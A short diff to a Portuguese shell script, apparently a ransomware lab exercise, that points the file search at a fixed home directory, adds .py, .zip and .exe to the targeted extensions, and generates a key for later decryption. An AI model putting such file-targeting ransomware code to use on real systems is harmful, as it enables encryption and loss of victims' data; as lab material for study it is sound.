@@ -6,7 +6,8 @@
 
 # local e exntesões de arquivos que serão atacadas neste lab:
 #arquivos=$(ls *.txt *.tar *.gzip *.doc *.docx *.xls *.xlsx *.ppt *.pptx *.sql 2>/dev/null)
-arquivos=$(find $(pwd) -print | egrep ".txt|.sql|.xls|.doc|.pdf")
+volume_alvo=/home/vergani/arquivos
+arquivos=$(find $volume_alvo -print | egrep ".txt|.sql|.xls|.doc|.pdf|.py|.zip|.exe")
 
 # variavel que vai armazenar chave privada para decriptar
 chave=$(/usr/bin/dbus-uuidgen)
